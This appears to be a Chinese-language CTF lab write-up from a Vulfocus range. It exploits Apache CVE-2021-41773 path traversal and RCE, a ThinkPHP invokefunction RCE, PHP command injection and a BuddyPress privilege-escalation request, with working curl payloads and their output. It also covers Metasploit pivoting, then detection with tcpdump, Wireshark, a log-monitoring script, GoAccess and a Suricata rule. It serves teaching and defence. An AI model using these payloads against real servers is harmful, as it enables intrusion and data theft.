┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ curl -I http://10.37.133.3:42286

HTTP/1.1 200 OK
Date: Sun, 25 May 2025 06:04:51 GMT
Server: Apache/2.4.49 (Debian)
Last-Modified: Sat, 09 Oct 2021 03:58:16 GMT
ETag: "29cd-5cde381698600"
Accept-Ranges: bytes
Content-Length: 10701
Vary: Accept-Encoding
Content-Type: text/html
```

**关键发现**：

- **服务器版本**: `Apache/2.4.49 (Debian)` - **这正是CVE-2021-41773漏洞影响的确切版本**
- **操作系统**: Debian Linux
- **文件修改时间**: 2021-10-09，与CVE披露时间吻合
- **响应正常**: HTTP 200状态码，服务器正常运行

##### 2.4 Nikto 安全扫描

**nikto扫描结果**:
![1748153891702](image/第一层两靶标攻击与利用检测/1748153891702.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ nikto -h http://10.37.133.3:42286

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.37.133.3
+ Target Hostname:    10.37.133.3
+ Target Port:        42286
+ Start Time:         2025-05-25 02:04:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.49 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ Apache/2.4.49 appears to be outdated (current is at least Apache/2.4.54).
+ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5cde381698600, mtime: gzip.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
+ 8909 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2025-05-25 02:05:04 (GMT-4) (8 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

**Nikto扫描分析**：

- **版本确认**: 再次确认Apache/2.4.49版本，**明确标注为过时版本**
- **安全配置缺陷**:
  - 缺少 `X-Frame-Options`头(点击劫持防护)
  - 缺少 `X-Content-Type-Options`头(MIME类型嗅探防护)
- **信息泄露**: ETag头可能泄露服务器inode信息
- **HTTP方法**: 支持POST, OPTIONS, HEAD, GET方法
- **重要**: 扫描过程中未触发明显的安全拦截，说明服务器配置相对宽松

##### 2.5 目录结构探测

```bash
# 使用 dirb 进行目录扫描
dirb http://10.37.133.3:42286
```

**dirb扫描结果**:
![1748153913104](image/第一层两靶标攻击与利用检测/1748153913104.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ dirb http://10.37.133.3:42286

-----------------
DIRB v2.22  
By The Dark Raver
-----------------

START_TIME: Sun May 25 02:05:11 2025
URL_BASE: http://10.37.133.3:42286/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                    

---- Scanning URL: http://10.37.133.3:42286/ ----
+ http://10.37.133.3:42286/cgi-bin/ (CODE:403|SIZE:279)                                                                                                                                        
+ http://10.37.133.3:42286/index.html (CODE:200|SIZE:10701)                                                                                                                                    
+ http://10.37.133.3:42286/server-status (CODE:403|SIZE:279)                                                                                                                                   
                                                                                                                                                                                               
-----------------
END_TIME: Sun May 25 02:05:12 2025
DOWNLOADED: 4612 - FOUND: 3
```

**目录发现分析**：

- **`/cgi-bin/` (403 Forbidden)**: **关键发现** - 这是CVE-2021-41773漏洞利用的核心路径
  - 403状态表明目录存在但访问被限制
  - CGI目录的存在为路径遍历攻击提供了入口点
- **`/index.html` (200 OK)**: 标准首页文件，大小10701字节
- **`/server-status` (403 Forbidden)**: Apache状态页面，被保护但存在

##### 2.6 信息收集总结

1. **漏洞确认**:

   - Apache版本2.4.49**完全匹配CVE-2021-41773的受影响版本**
   - 服务器配置标准，未发现特殊的安全加固
2. **攻击条件满足**:

   - **版本匹配**: 确认为易受攻击的Apache版本
   - **服务配置**: 标准Apache配置，为路径遍历攻击提供了条件
3. **安全态势评估**:

   - **高风险**: 版本完全匹配已知高危漏洞
   - **配置薄弱**: 缺少多个安全头，信息泄露风险
   - **攻击面**: CGI功能启用，为代码执行提供了可能

#### 3. 漏洞分析与利用

##### 3.1 CVE-2021-41773 漏洞原理

**漏洞基本信息**:

- **CVE编号**: CVE-2021-41773
- **CVSS评分**: 7.5 (高危)
- **漏洞类型**: 路径遍历 (Path Traversal)
- **影响版本**: Apache HTTP Server 2.4.49
- **漏洞原理**: Apache 2.4.49版本在处理URL路径规范化时存在缺陷，攻击者可以通过构造特殊的URL编码绕过路径限制，访问Web根目录之外的文件

**技术细节**:

- **根本原因**: Apache对URL中的路径分隔符和点号序列的处理不当
- **绕过机制**: 使用URL编码的点号(`%2e`)可以绕过路径规范化检查
- **攻击路径**: 通过Alias映射的目录(如 `/cgi-bin/`, `/icons/`)进行路径遍历

##### 3.2 路径遍历攻击实践

###### 3.2.1 基础路径遍历测试

```bash
# 尝试通过CGI路径读取 /etc/passwd 文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 尝试读取 Apache 配置文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/apache2/apache2.conf"

# 尝试读取其他敏感文件
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow"
curl "http://10.37.133.3:42286/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/proc/version"
```

**执行结果分析**:
所有通过 `/cgi-bin/`路径的攻击尝试都返回了 `500 Internal Server Error`，这表明：

1. **CGI配置问题**: CGI模块可能没有正确配置或缺少必要的CGI脚本
2. **路径解析问题**: Apache可能对CGI路径下的路径遍历有特殊处理
3. **权限限制**: 可能存在额外的访问控制机制

###### 3.2.2 非CGI路径的直接遍历攻击

CVE-2021-41773不仅限于CGI路径，我们尝试其他映射路径：

```bash
# 尝试通过icons路径进行遍历
curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 尝试通过manual路径进行遍历  
curl "http://10.37.133.3:42286/manual/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 直接根路径尝试
curl "http://10.37.133.3:42286/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

**执行结果**:

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ curl "http://10.37.133.3:42286/icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

**攻击结果分析**:

1. ✅ **`/icons/` 路径攻击成功**

   - **状态**: 🎉 完全成功 - 读取到完整的 `/etc/passwd` 文件
   - **编码方式**: 仅使用基础的单层URL编码 `%2e%2e`（不需要双重编码）
   - **技术意义**: 证明CVE-2021-41773不仅限于CGI路径，还影响Apache的静态资源映射
2. 🚫 **`/manual/` 路径被阻止**

   - **状态**: 403 Forbidden
   - **原因**: Manual文档路径可能有特殊的访问控制配置
   - **安全策略**: 表明某些路径映射有额外的安全限制
3. 🚫 **直接根路径被阻止**

   - **状态**: 403 Forbidden
   - **原因**: 根路径的路径遍历被Apache的基础安全机制阻止

##### 3.3 远程代码执行(RCE)攻击

###### 3.3.1 CGI路径的RCE攻击尝试

```bash
# 通过CGI路径执行shell命令
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; id"
```

**RCE攻击结果**:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**🎉 RCE攻击成功！**

- **权限获取**: 成功以 `www-data`用户身份执行命令
- **攻击方式**: 通过CGI路径结合路径遍历，直接调用系统shell
- **编码技术**: 使用混合编码 `.%2e`绕过路径限制

###### 3.3.2 系统信息收集

```bash
# 获取系统信息
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; uname -a"

# 查看当前目录
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; pwd"

# 列出根目录内容
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; ls -la /"
```

##### 3.4 Flag文件搜索与获取

###### 3.4.1 系统文件搜索

```bash
# 搜索系统中所有包含flag的文件
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; find / -name '*flag*' 2>/dev/null"
```

**搜索结果**:

```bash
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.0/tty/ttyS0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/waitflags.ph
```

**🎯 找到了！flag文件在 `/tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`**

###### 3.4.2 Flag内容读取

```bash
# 读取flag文件内容
curl "http://10.37.133.3:42286/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; echo; cat /tmp/flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}"
```

**Flag获取成功**: `flag-{bmha8de6a45-2ae2-4615-97ff-1af1edd5afcf}`

### 步骤六 发现终点靶标

同样，ip a查看第二层靶机的网卡，发现双网卡
![](./pics/发现双网卡.png)
升级shell
`sessions -u <>`
进入新启动的shell
`sessions -i <>`
设置pivot路由
`run autoroute -s 10,10,10,0/24`
![](./pics/设置pivot路由.png)<br>
![](./pics/设置pivot路由成功.png)<br>
扫描发现终点靶标
![](./pics/发现终点靶标.png)<br>

### 步骤六 攻击终点靶标

#### thinkphp

cve_2018_1002015
1. 浏览器访问以下网页
![](./pics/访问thinkphp.png)

2. 浏览器访问以下网页，执行phpinfo()
`http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
![](./pics/phpinfo.png)<br>
3. 执行系统命令`ls /tmp`

`http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20/tmp`
![](./pics/第三个flag.png)<br>


# 漏洞利用检测
## 入口靶标利用检测
#### 手动检测
1. **wireshark抓包**
   我们可以利用wireshark抓包来查看攻击行为。
   ```bash
   sudo tcpdump -i eth1 -w capture.pcap port 18813
   ```
   ![1747914135600](image/readme/1747914135600.png)
   打开``wireshark``并分析 : 
   ![1747914180373](image/readme/1747914180373.png)
   **过滤http , 分析其中一个包 , 右键follow ->http stream**
   ![1748236380067](image/readme/1748236380067.png)
   ![1748236450360](image/readme/1748236450360.png)
   针对WordPress站点BuddyPress插件的API请求：

   ```
   PUT /wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF HTTP/1.1
   ```

   - **方法**: PUT 
   - **端点**: `/wp-json/buddypress/v1/signup/activate/v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF`
   - BuddyPress的REST API端点
   - 尝试激活一个用户注册(v6EeK8XWihRsxXvXAWPMVzSTO2gs7WdF是激活密钥)
   - **请求体**: 
      ```json
      {
         "user_login": "attacker2",
         "user_email": "attacker2@163.com",
         "user_name": "attacker2",
         "password": "attacker2"
      }
      ```
      - 尝试创建/激活用户"attacker2"
   - **状态码**: 404 Not Found
      ```
      HTTP/1.1 404 Not Found
      ```
   - **响应体**:
      ```json
      {
         "code": "bp_rest_invalid_activation_key",
         "message": "Invalid activation key.",
         "data": {
            "status": 404
         }
      }
      ```

   1. **攻击行为**:
      - 尝试通过BuddyPress API创建/激活用户账户

   2. **回显**:
      - 服务器返回404和"Invalid activation key"
      - 表明提供的激活密钥无效或已过期

---

#### 自动化检测
**[ 方法一 ]**
1. **监听日志**
   进入wordpress容器中查看启动文件``start.sh`` , 我们可以看到 `/etc/init.d/mysql restart` 和 `/etc/init.d/apache2 restart` 这两个命令，这说明容器的日志很有可能写入了 `/var/log/apache2/access.log` 文件，所以我们可以实时监听这个文件，并查看注册或权限提升的尝试行为。
   ```bash
   root@3efe65610f5a:/# 
   cat start.sh
   #!/bin/bash
   /etc/init.d/mysql restart
   /etc/init.d/apache2 restart

   /usr/bin/tail -f /dev/null
   ```

   我们的监听python代码如下：
   ```python
   import time
   import re

   def monitor_access_log(log_path):
      print("[*] 正在实时监控日志文件: {}".format(log_path))

      try:
         with open(log_path, 'r') as f:
               f.seek(0, 2)  # 移动到文件末尾，监听新增内容

               while True:
                  line = f.readline()
                  if not line:
                     time.sleep(0.5)
                     continue

                  # 示例攻击行为规则：你可以继续加规则
                  if re.search(r'PUT\s+/wp-json/buddypress/v1/signup/activate/', line):
                     print("[!!!] 权限提升尝试检测到: {}".format(line.strip()))

                  elif re.search(r'POST\s+/wp-json/buddypress/v1/signup', line):
                     print("[!!!] 注册攻击行为检测到: {}".format(line.strip()))

                  elif re.search(r'/wp-admin', line) and 'wp-login.php' not in line:
                     print("[*] 后台访问行为检测到: {}".format(line.strip()))

      except Exception as e:
         print("[!] 错误: {}".format(e))

   if __name__ == "__main__":
      monitor_access_log("/var/log/apache2/access.log")
   ```
   - 当攻击者注册时
   ![1747911181136](image/readme/1747911181136.png)
   - 当攻击者激活时
   ![1747911640431](image/readme/1747911640431.png)
   可以发现均监听到了相应的攻击行为。

---

**[ 方法二 ]**

2. **goaccess 日志分析工具**

GoAccess 是一个开源的实时日志分析工具，专门用于分析 Web 服务器日志文件。它能够快速解析 Apache、Nginx 等常见 Web 服务器生成的日志，并提供直观的可视化统计信息，帮助安全人员和运维人员快速发现异常行为或潜在攻击。
- 为了使用 GoAccess 进行日志分析，首先需要安装它：
   ```bash
   root@3efe65610f5a:/# 
   apt update && apt install goaccess
   ```
   ![1747912555913](image/readme/1747912555913.png)
- 接下来我们使用 GoAccess 对 `/var/log/apache2/access.log` 文件进行分析：
   ```bash
   root@3efe65610f5a:/# 
   goaccess -f /var/log/apache2/access.log \
   -c \
   --log-format='%h %^[%d:%t %^] "%r" %s %b "%R" "%u"' \
   --date-format=%d/%b/%Y \
   --time-format=%H:%M:%S
   ```
   | 参数 | 说明 |
   |------|------|
   | `-f /var/log/apache2/access.log` | 指定要分析的日志文件路径。`access.log` 是 Apache 默认记录访问请求的日志文件。 |
   | `-c` | 进入交互式配置界面，用户可以在其中选择需要启用的模块（如 IP 地理位置查询、是否显示图表等）。 |
   | `--log-format=...` | 自定义日志格式，必须与 `access.log` 的实际格式匹配，否则无法正确解析。 |
   | `--date-format=%d/%b/%Y` | 设置日期格式为日/月/年（例如：10/Apr/2025） |
   | `--time-format=%H:%M:%S` | 设置时间格式为小时:分钟:秒 |


- GoAccess 需要通过 `--log-format` 告知其如何解析日志内容。以下是一个典型的 Apache `access.log` 条目示例：

   ```
   192.168.1.100 - - [10/Apr/2025:14:23:17 +0000] "GET /index.php HTTP/1.1" 200 3456 "-" "Mozilla/5.0"
   ```

   对应的 `--log-format` 解释如下：

   ```
   %h %^[%d:%t %^] "%r" %s %b "%R" "%u"
   ```

   | 格式符号 | 含义 |
   |----------|------|
   | `%h` | 客户端 IP 地址（host） |
   | `%^[` | 忽略左方括号 `[` |
   | `%d` | 日期（day/month/year） |
   | `%t` | 时间（hour:minute:second） |
   | `%r` | 请求行（method + path + protocol） |
   | `%s` | 响应状态码（如 200, 404） |
   | `%b` | 响应体大小（bytes） |
   | `%R` | Referer 头（即请求来源页面） |
   | `%u` | User-Agent（客户端浏览器信息） |

   > ⚠️ 注意：如果你的日志格式不同，比如包含额外字段（如请求耗时、cookie 等），你需要相应地修改 `--log-format` 字符串，否则会导致解析失败。


   执行上述命令后，GoAccess 会进入终端界面并展示以下关键指标：

   1. **总体请求统计**
      - 总请求数、有效请求数、无效请求（如格式错误）数。
      - 成功响应（2xx）、重定向（3xx）、客户端错误（4xx）、服务端错误（5xx）占比。

   2. **访客 IP 统计**
      - 显示每个 IP 的请求次数，可用于识别异常高频访问者（如爬虫或攻击者）。

   3. **请求 URL 排名**
      - 展示最常访问的 URL，有助于识别热门资源或潜在攻击入口（如 `/wp-json/buddypress/v1/signup`）。

   4. **HTTP 状态码分布**
      - 识别大量 404 或 403 请求，可能表示扫描行为或尝试漏洞利用。

   5. **User-Agent 分布**
      - 查看访问者的浏览器类型，识别非正常访问（如脚本或自动化工具发起的请求）。

   6. **时间趋势图**
      - 展示每小时/每天的访问量变化，帮助识别突发流量或 DDoS 攻击。



   在本次实验中，GoAccess 可以用来监控 WordPress 漏洞攻击行为，例如：

   - ✅ **检测注册绕过攻击**：通过查看 `/wp-json/buddypress/v1/signup` 接口的访问频率。
   - ✅ **识别提权尝试**：检查是否有大量对 `/wp-json/buddypress/v1/members/me` 的 POST 请求。
   - ✅ **追踪恶意上传行为**：查找 `/wp-admin/media-new.php` 或 `/wp-content/uploads/` 相关请求。
   ![1747912486912](image/readme/1747912486912.png)

---

**[ 方法三 ]**

3. **suricata检测**
   Suricata 是一个高性能的开源网络 IDS（入侵检测系统）、IPS（入侵防御系统）和网络安全监控引擎。它能够实时分析网络流量，检测恶意行为，并通过规则匹配识别攻击模式。

   **1. 安装启动 Suricata**
   ```bash
   docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4
   ```
   - `suricata` 包含了核心引擎和默认规则集。
   - 安装完成后，默认配置文件位于 `/etc/suricata/suricata.yaml`。
   **2. 编辑 Suricata 配置文件**
      - 首先进入容器内部
      ```bash
      docker exec -it suricata bash
      ```
      - 创建一个自定义规则文件 , 写入：
      ```bash 
      echo '
      alert http $EXTERNAL_NET any -> $HOME_NET any (
         msg:"CVE-2021-21389: BuddyPress 提权尝试";
         flow:to_server,established;
         content:"POST"; http_method;
         content:"/wp-json/buddypress/v1/members/me"; http_uri;
         content:"roles"; http_client_body; fast_pattern;
         content:"administrator"; http_client_body;
         sid:1000001;
         rev:1;
         classtype:web-application-attack;
         )' > /etc/suricata/rules/cve-2021-21389.rules
      ```
      - 加载自定义规则
      ```bash
      sudo vim /etc/suricata/suricata.yaml
      ```
      在 ``rule-files:`` 下添加一行：
      ```bash
       - cve-2021-21389.rules
      ```
      ##### **规则解释：**

      | 字段 | 说明 |
      |------|------|
      | `alert http` | 表示这是一个 HTTP 协议的告警规则 |
      | `$EXTERNAL_NET any -> $HOME_NET any` | 表示从外部网络发起请求到内部网络主机的任意端口 |
      | `msg` | 告警信息描述 |
      | `flow:to_server,established` | 仅匹配已建立连接的服务器方向流量 |
      | `content:"POST"` + `http_method` | 匹配 POST 请求方法 |
      | `content:"/wp-json/buddypress/v1/members/me"` + `http_uri` | 匹配请求 URI 是否包含特定路径 |
      | `content:"roles"` + `http_client_body` + `fast_pattern` | 快速匹配请求体中的 "roles" 字段 |
      | `content:"administrator"` + `http_client_body` | 匹配请求体中是否包含 `"administrator"` |
      | `sid:1000001` | 规则唯一 ID |
      | `rev:1` | 规则版本号 |
      | `classtype:web-application-attack` | 分类为 Web 应用攻击 |

      **3. 重启docker**
      ```bash
      sudo systemctl restart suricata
      ```
      **4. 触发攻击并验证检测效果**
      打开另一个终端，发送提权请求：
      ```bash
      curl -X POST http://<your_wordpress_ip>/wp-json/buddypress/v1/members/me \
         -H "X-WP-Nonce: <valid_nonce>" \
         -H "Content-Type: application/json" \
         -d '{"roles": "administrator"}'
      ```
      替换 `<your_wordpress_ip>` 和 `<valid_nonce>` 为你实际的测试目标地址和有效的 Nonce 值。
      **5. 查看 Suricata 告警日志**
      - 切换回运行 Suricata 的终端，或查看日志文件：
         ```bash
         tail -f /var/log/suricata/fast.log
         ```
      - 可以看到终端中出现日志：
         ```
         [**] [1:1000001:1] CVE-2021-21389: BuddyPress 提权尝试 [**]
         [Priority: 1]
         05/22-14:23:17.123456 [ET.http] POST /wp-json/buddypress/v1/members/me HTTP/1.1
         ```
      - 这表明 Suricata 成功检测到了 CVE-2021-21389 提权攻击尝试。
---


## 内网第一层靶标利用检测
### （二）第一层靶标一：`vulshare_nginx-php-flag:latest` 攻击与利用检测

#### 1. 启动靶机环境

在 Vulfocus 平台中，找到 `vulshare_nginx-php-flag:latest` 镜像，点击 "启动"按钮。Vulfocus 会为该容器分配一个 IP 地址和端口

启动靶机
![1748016291402](image/第一层两靶标攻击与利用检测/1748016291402.png)

#### 2. 信息收集

靶机的访问地址为 `http://10.37.133.3:8630/`。

使用 `nmap` 对靶机IP `10.37.133.3` 和端口 `8630` 进行基础的端口扫描，了解其开放的服务：

```bash
nmap -sV -p 8630 10.37.133.3
```

![1748016549013](image/第一层两靶标攻击与利用检测/1748016549013.png)

```bash
┌──(kali㉿kali-attacker)-[~/ctf-games/fofapro/vulfocus]
└─$ nmap -sV -p 8630 10.37.133.3

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-23 12:08 EDT
Nmap scan report for kali-linux.host-only--3 (10.37.133.3)
Host is up.

PORT     STATE    SERVICE VERSION
8630/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds
```

通过浏览器访问靶机提供的 Web 服务 `http://10.37.133.3:8630/`。

访问网站页面如下：
![1748016340512](image/第一层两靶标攻击与利用检测/1748016340512.png)

页面上直接给出了关键提示信息：`index.php?cmd=ls /tmp`。这强烈暗示了存在一个通过 `index.php` 的 `cmd` GET参数执行任意命令的漏洞。

#### 3. 漏洞分析与利用

靶标名称 `vulshare_nginx-php-flag` 和页面提示 `index.php?cmd=ls /tmp` 明确指出了这是一个基于 Nginx 和 PHP 的应用，并且存在命令注入漏洞，目标是找到一个 "flag"。

**利用方式：通过 `cmd` GET 参数执行命令**
页面提示已经给出了利用方法：`index.php` 文件接受一个名为 `cmd` 的 GET 参数，其值会被服务器执行。

* **验证初步命令执行**：
  根据页面提示，直接访问 `http://10.37.133.3:8630/index.php?cmd=ls%20/tmp` (注意 URL 编码空格为 `%20`)。

  ```bash
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"
  ```

  观察返回结果，确认 `/tmp` 目录下的内容

  返回结果为:

  ```
  index.php?cmd=ls /tmpflag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}
  ```

  ![1748016675838](image/第一层两靶标攻击与利用检测/1748016675838.png)

  通过执行 `ls /tmp` 命令,我们直接获得了flag: `flag-{bmha755c46b-7381-4beb-9495-c15d83956d7e}`

  ![1748019835789](image/第一层两靶标攻击与利用检测/1748019835789.png)
* **漏洞验证补充**：
  虽然我们已经获得了flag,但为了完整验证该漏洞的利用面,我们可以尝试执行其他系统命令:

  ```bash
  # 确定当前用户和权限
  curl "http://10.37.133.3:8630/index.php?cmd=id"
  ```

  返回结果显示为 www-data 用户:

  ```
  index.php?cmd=ls /tmpuid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

  ![1748017681838](image/第一层两靶标攻击与利用检测/1748017681838.png)

  ```bash
  # 查看系统信息
  curl "http://10.37.133.3:8630/index.php?cmd=uname%20-a"
  ```

  返回结果显示系统信息:

  ```
  index.php?cmd=ls /tmpLinux c93755678f6c 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 GNU/Linux
  ```

  ![1748017785746](image/第一层两靶标攻击与利用检测/1748017785746.png)

  ```bash
  # 查看当前目录结构
  curl "http://10.37.133.3:8630/index.php?cmd=ls%20-la%20/"
  ```

  返回结果显示根目录结构:

  ![1748017797697](image/第一层两靶标攻击与利用检测/1748017797697.png)

#### 4. 威胁检测

##### 4.1查看 Nginx 访问日志:

首先，需要确定 `vulshare_nginx-php-flag` 容器的 ID 或名称：

```bash
docker ps
```

目标容器的 ID 为 `c93755678f6c`。
进入容器内部：

```bash
docker exec -it c93755678f6c /bin/bash
```

Nginx 的访问日志通常位于 `/var/log/nginx/access.log`。
查看并筛选可疑请求：

```bash
# 实时查看日志 (部分内容)
tail -f /var/log/nginx/access.log
```

![1748017954540](image/第一层两靶标攻击与利用检测/1748017954540.png)

```bash
# 筛选包含命令执行的请求
cat /var/log/nginx/access.log | grep "index.php?cmd="
```

在日志中可以看到我们之前执行的命令,例如:

```
10.37.133.3 - - [23/May/2025:16:10:43 +0000] "GET /index.php?cmd=ls%20/tmp HTTP/1.1" 200 79 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:27:50 +0000] "GET /index.php?cmd=id HTTP/1.1" 200 86 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:31 +0000] "GET /index.php?cmd=uname%20-a HTTP/1.1" 200 134 "-" "curl/8.11.0"
10.37.133.3 - - [23/May/2025:16:29:50 +0000] "GET /index.php?cmd=ls%20-la%20/ HTTP/1.1" 200 1137 "-" "curl/8.11.0"
```

##### 4.2网络流量捕获 :

  由于我们的攻击机同时也是 Docker 容器的宿主机，当从 Kali 访问映射到本地 IP (`10.37.133.3:8630`) 的容器服务时，流量实际上是在 Docker 的内部网络中流动的。我们需要监听 Docker 的网桥接口（通常是 `docker0`）以及容器在该网络中的内部 IP 和实际服务端口（本实验中是 `172.17.0.2` 的 `80` 端口）。

1. **确定容器内部 IP 和网络接口**:
   首先，通过 `docker ps` 获取容器 ID (本例中为 `c93755678f6c`)。
   然后，使用 `docker inspect <container_id>` 查看容器网络详情，找到其在 `bridge` 网络（通常对应 `docker0` 接口）下的 `IPAddress` (本例中为 `172.17.0.2`)。

   ```
   docker inspect c93755678f6c
   ```

![1748019175085](image/第一层两靶标攻击与利用检测/1748019175085.png)

2. **执行 `tcpdump` 命令**:
   在 Kali 主机上，打开一个终端窗口，执行以下命令，监听 `docker0` 接口上与容器 `172.17.0.2` 的 `80` 端口相关的流量：

```bash
sudo tcpdump -i docker0 -A 'host 172.17.0.2 and port 80' -w nginx_php_flag_traffic.pcap  
```

    ![1748019251492](image/第一层两靶标攻击与利用检测/1748019251492.png)

3. **产生流量**:
   在另一个终端窗口执行访问靶机的命令:

   ```bash
   curl "http://10.37.133.3:8630/index.php?cmd=ls%20/tmp"  
   ```

   ![1748019262540](image/第一层两靶标攻击与利用检测/1748019262540.png)
4. **停止抓包并分析**:

   完成 `curl` 命令后，回到 `tcpdump` 终端按 `Ctrl+C` 停止抓包。
   此时，`nginx_php_flag_traffic.pcap` 文件中应包含捕获到的数据包。可以使用 Wireshark 打开该文件进行详细分析，可以清晰看到 HTTP GET 请求中的命令执行参数

   ![1748019616647](image/第一层两靶标攻击与利用检测/1748019616647.png)

   通过 Wireshark 打开 nginx_php_flag_traffic.pcap 文件后，可以清晰地追踪到攻击流程：
5. 观察到从攻击机IP (10.37.133.3) 到容器内部IP (172.17.0.2) 的TCP三次握手过程，建立了端口 80 上的连接
6. 捕获到一个源自 10.37.133.3、目标为 172.17.0.2 的HTTP GET请求。该请求的详细信息显示其请求路径为 /index.php?cmd=ls%20/tmp，这与我们通过 curl 发送的命令注入payload完全一致
   ![1748019792810](image/第一层两靶标攻击与利用检测/1748019792810.png)
7. 观察到从容器 (172.17.0.2) 返回给攻击机 (10.37.133.3) 的 HTTP/1.1 200 OK 响应，表明服务器成功处理了该请求

这些捕获到的数据包有力地证明了攻击者通过构造恶意的HTTP GET请求将 ls /tmp 命令传递给了目标服务器，并成功执行。

### （三）第一层靶标二：`Samba CVE-2017-7494`
#### 漏洞介绍

CVE-2017-7494是Samba软件中的一个严重安全漏洞

- Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。

